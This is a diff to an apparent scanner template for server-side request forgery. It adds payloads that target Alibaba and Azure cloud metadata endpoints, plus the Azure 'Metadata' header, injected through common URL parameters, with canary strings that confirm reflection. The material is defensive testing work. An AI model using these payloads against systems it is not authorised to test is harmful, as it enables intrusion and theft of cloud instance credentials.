@@ -27,7 +27,15 @@ request:
   method: GET
   param_names: [url, redirect, next, dest, target, image, file, path, callback]
   payload: "http://169.254.169.254/latest/meta-data/"
+  payloads:
+    - "http://100.100.100.200/latest/meta-data/"
+    - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+  headers:
+    Metadata: "true"
 oracle:
   name: reflection
   params:
     canary: "ami-id"
+    canary_by_payload:
+      "http://100.100.100.200/latest/meta-data/": "instance-id"
+      "http://169.254.169.254/metadata/instance?api-version=2021-02-01": "vmId"
